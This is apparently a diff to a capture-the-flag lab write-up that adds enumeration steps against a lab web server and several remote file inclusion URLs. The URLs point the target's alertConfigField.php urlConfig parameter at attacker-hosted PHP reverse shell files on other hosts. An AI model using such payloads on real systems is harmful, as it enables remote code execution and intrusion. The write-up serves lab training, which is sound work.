@@ -84,9 +84,21 @@ We visit the page and we are greeted by a picture:
 
 ![](../../img/Pasted%20image%2020220827204644.png)
 
+We perform enumeration on the secret page and the results are as follows:
+
+![](../../img/Pasted%20image%2020220827220920.png)
+
+We visit the page /administrator but it seems that we need credentials again:
+
+![](../../img/Pasted%20image%2020220827220954.png)
+
+After this, we tried to use searchsploit for any vulnerabilities:
+
+
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47:8080/reverse_shell.php?
 
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php
 
+http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47/php-reverse-shell.php?
